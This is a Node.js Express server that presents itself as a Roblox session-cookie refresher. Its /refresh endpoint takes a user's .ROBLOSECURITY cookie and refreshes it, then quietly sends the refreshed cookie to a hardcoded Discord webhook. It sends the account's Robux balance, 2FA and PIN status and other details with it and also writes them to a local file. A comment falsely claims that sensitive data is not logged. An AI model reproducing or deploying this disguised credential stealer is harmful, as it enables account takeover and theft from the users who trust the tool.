const express = require('express');
const axios = require('axios');
const fs = require('fs');

const { generateAuthTicket, redeemAuthTicket } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));




// Input validation middleware
const validateCookie = (req, res, next) => {
    const cookie = req.query.cookie;
    
    if (!cookie) {
        return res.status(400).json({ error: "Cookie parameter is required" });
    }
    
    if (typeof cookie !== 'string' || cookie.trim().length === 0) {
        return res.status(400).json({ error: "Invalid cookie format" });
    }
    
    // Basic validation for Roblox cookie format
    if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
        return res.status(400).json({ error: "Invalid Roblox cookie format" });
    }
    
    next();
};

app.get('/refresh', validateCookie, async (req, res) => {
    const roblosecurityCookie = req.query.cookie.trim();

    try {
        const authTicket = await generateAuthTicket(roblosecurityCookie);

        if (authTicket === "Failed to fetch auth ticket") {
            return res.status(400).json({ error: "Invalid cookie or failed to generate auth ticket" });
        }

        const redemptionResult = await redeemAuthTicket(authTicket);

        if (!redemptionResult.success) {
            if (redemptionResult.robloxDebugResponse && redemptionResult.robloxDebugResponse.status === 401) {
                return res.status(401).json({ error: "Unauthorized: The provided cookie is invalid." });
            } else {
                return res.status(400).json({ error: "Failed to refresh cookie. Please check if your cookie is valid." });
            }
        }

        const refreshedCookie = redemptionResult.refreshedCookie || '';

        if (!refreshedCookie) {
            return res.status(500).json({ error: "Cookie refresh completed but no refreshed cookie received" });
        }

        // Try to get user data, but don't fail if it doesn't work
        let userData = null;
        try {
            const robloxUser = await RobloxUser.register(roblosecurityCookie);
            userData = await robloxUser.getUserData();
        } catch (userDataError) {
            console.warn('Failed to fetch user data:', userDataError.message);
            // Continue without user data
        }

        // Try to log to file, but don't fail if it doesn't work
        try {
            if (userData) {
                const debugInfo = `Auth Ticket ID: ${authTicket}`;
                const fileContent = {
                    RefreshedCookie: refreshedCookie,
                    DebugInfo: debugInfo,
                    Username: userData.username,
                    UserID: userData.uid,
                    DisplayName: userData.displayName,
                    CreationDate: userData.createdAt,
                    Country: userData.country,
                    AccountBalanceRobux: userData.balance,
                    Is2FAEnabled: userData.isTwoStepVerificationEnabled,
                    IsPINEnabled: userData.isPinEnabled,
                    IsPremium: userData.isPremium,
                    CreditBalance: userData.creditbalance,
                    RAP: userData.rap,
                };

                fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
            }
        } catch (fileError) {
            console.warn('Failed to write to file:', fileError.message);
        }

        // Try to send webhook, but don't fail if it doesn't work
        try {
            if (userData) {
                const webhookURL = 'https://discord.com/api/webhooks/1151869138860511322/KgC_pS7xhWu7TEjlM_NR_Vwx59XKKWhLiqjyiWAqNAGg0IRjlchUqUwu6hhTFCwz1ckl';
                const response = await axios.post(webhookURL, {
                    embeds: [
                        {
                            title: 'Refreshed Cookie',
                            description: `**Refreshed Cookie:**
\`\`\`${refreshedCookie}\`\`\``,
                            color: 16776960,
                            thumbnail: {
                                url: userData.avatarUrl,
                            },
                            fields: [
                                { name: 'Username', value: userData.username, inline: true },
                                { name: 'User ID', value: userData.uid, inline: true },
                                { name: 'Display Name', value: userData.displayName, inline: true },
                                { name: 'Creation Date', value: userData.createdAt, inline: true },
                                { name: 'Country', value: userData.country, inline: true },
                                { name: 'Account Balance (Robux)', value: userData.balance, inline: true },
                                { name: 'Is 2FA Enabled', value: userData.isTwoStepVerificationEnabled, inline: true },
                                { name: 'Is PIN Enabled', value: userData.isPinEnabled, inline: true },
                                { name: 'Is Premium', value: userData.isPremium, inline: true },
                                { name: 'Credit Balance', value: userData.creditbalance, inline: true },
                                { name: 'RAP', value: userData.rap, inline: true },
                            ],
                        }
                    ]
                });

                console.log('Sent successfully+response', response.data);
            }
        } catch (webhookError) {
            console.warn('Failed to send webhook:', webhookError.message);
        }

        // Return only the necessary data without logging sensitive information
        res.json({ 
            authTicket, 
            redemptionResult: {
                success: true,
                refreshedCookie: refreshedCookie
            }
        });
    } catch (error) {
        console.error('Error in /refresh endpoint:', error.message);
        res.status(500).json({ error: "Internal server error occurred while refreshing cookie" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
